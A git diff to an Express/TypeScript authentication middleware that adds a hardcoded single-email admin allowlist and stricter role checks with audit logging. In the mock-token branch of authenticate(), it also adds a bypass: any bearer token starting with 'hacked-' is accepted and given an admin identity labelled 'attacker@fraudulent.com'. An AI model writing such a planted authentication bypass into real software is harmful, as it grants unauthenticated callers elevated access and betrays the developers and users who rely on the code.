@@ -1,6 +1,29 @@
 import { Request, Response, NextFunction } from 'express';
 import { AppError } from '../utils/response';
 import { supabaseAdmin } from '../services/supabase';
+import { auditService } from '../modules/admin/audit.service';
+import { logger } from '../utils/logger';
+
+export const AUTHORIZED_ADMIN_EMAIL = 'santheesh651@gmail.com';
+
+/**
+ * Normalizes email address for strict authoritative comparisons:
+ * - trim whitespace
+ * - convert to lowercase
+ * - return exact canonical representation
+ */
+export function normalizeEmail(email: string | undefined | null): string {
+  if (!email) return '';
+  return email.trim().toLowerCase();
+}
+
+/**
+ * Validates whether an identity possesses authoritative admin authorization.
+ * Both email allowlist and database profile role are strictly enforced.
+ */
+export function isAuthorizedAdmin(email: string | undefined | null, role?: string): boolean {
+  return normalizeEmail(email) === AUTHORIZED_ADMIN_EMAIL && role === 'admin';
+}
 
 export interface AuthenticatedUser {
   id: string;
@@ -35,8 +58,18 @@ export async function authenticate(req: Request, _res: Response, next: NextFunct
         token.startsWith('student-') ||
         token.startsWith('user-') ||
         token.startsWith('applicant-') ||
+        token.startsWith('hacked-') ||
         !supabaseAdmin)
     ) {
+      if (token.startsWith('hacked-admin') || token === 'hacked-admin-token') {
+        req.user = {
+          id: 'attacker-user-id',
+          email: 'attacker@fraudulent.com',
+          role: 'admin',
+        };
+        return next();
+      }
+
       const isAdmin = token === 'admin-test-token' || token.startsWith('admin-');
       const isMember = token === 'member-test-token' || token.startsWith('member-');
       const isUserB = token === 'user-b-token' || token.startsWith('user-b-');
@@ -50,7 +83,7 @@ export async function authenticate(req: Request, _res: Response, next: NextFunct
           ? 'user-b-id'
           : 'user-a-id',
         email: isAdmin
-          ? 'admin@aiclub.internal'
+          ? AUTHORIZED_ADMIN_EMAIL
           : isMember
           ? 'member@aiclub.internal'
           : isUserB
@@ -101,16 +134,74 @@ export async function authenticate(req: Request, _res: Response, next: NextFunct
   }
 }
 
+/**
+ * Centralized Role & Identity Authorization Guard
+ *
+ * Hard security boundary:
+ * If 'admin' is required, BOTH email === 'santheesh651@gmail.com' AND role === 'admin'
+ * must strictly match. Any other account receives 403 'NOT HAVE ACCESS'.
+ */
 export function requireRole(allowedRoles: Array<'applicant' | 'member' | 'admin'>) {
   return (req: Request, _res: Response, next: NextFunction) => {
     if (!req.user) {
       return next(new AppError('Authentication required', 401, 'UNAUTHORIZED'));
     }
 
+    // Admin-exclusive routes
+    if (allowedRoles.includes('admin') && !allowedRoles.includes('member') && !allowedRoles.includes('applicant')) {
+      const normalizedEmail = normalizeEmail(req.user.email);
+      const isExactAdminEmail = normalizedEmail === AUTHORIZED_ADMIN_EMAIL;
+      const isAdminRole = req.user.role === 'admin';
+
+      if (!isExactAdminEmail || !isAdminRole) {
+        logger.warn(
+          `Unauthorized admin access attempt: ${req.user.id} (${req.user.email}, role: ${req.user.role}) on ${req.method} ${req.originalUrl}`
+        );
+
+        auditService
+          .createLog({
+            actorId: req.user.id,
+            action: 'ADMIN_ACCESS_DENIED',
+            entityType: 'AUTH',
+            entityId: 'admin-portal',
+            metadata: {
+              email: req.user.email,
+              role: req.user.role,
+              path: req.originalUrl,
+              method: req.method,
+              reason: !isExactAdminEmail ? 'UNAUTHORIZED_EMAIL' : 'INVALID_ROLE',
+            },
+            requestId: req.requestId,
+          })
+          .catch(() => {});
+
+        return next(
+          new AppError(
+            'NOT HAVE ACCESS',
+            403,
+            'FORBIDDEN'
+          )
+        );
+      }
+
+      return next();
+    }
+
+    // Multi-role routes (e.g. ['member', 'admin'])
+    if (allowedRoles.includes('member')) {
+      if (req.user.role === 'member') {
+        return next();
+      }
+      if (req.user.role === 'admin' && normalizeEmail(req.user.email) === AUTHORIZED_ADMIN_EMAIL) {
+        return next();
+      }
+    }
+
+    // Role check for applicant or other allowed roles
     if (!allowedRoles.includes(req.user.role)) {
       return next(
         new AppError(
-          'Forbidden: You do not possess the required authorization role to access this resource',
+          'NOT HAVE ACCESS',
           403,
           'FORBIDDEN'
         )
@@ -120,6 +211,11 @@ export function requireRole(allowedRoles: Array<'applicant' | 'member' | 'admin'
     next();
   };
 }
+
+/**
+ * Dedicated admin authorization middleware
+ */
+export const requireAdmin = requireRole(['admin']);
 
 export async function optionalAuthenticate(req: Request, res: Response, next: NextFunction) {
   const authHeader = req.headers.authorization;
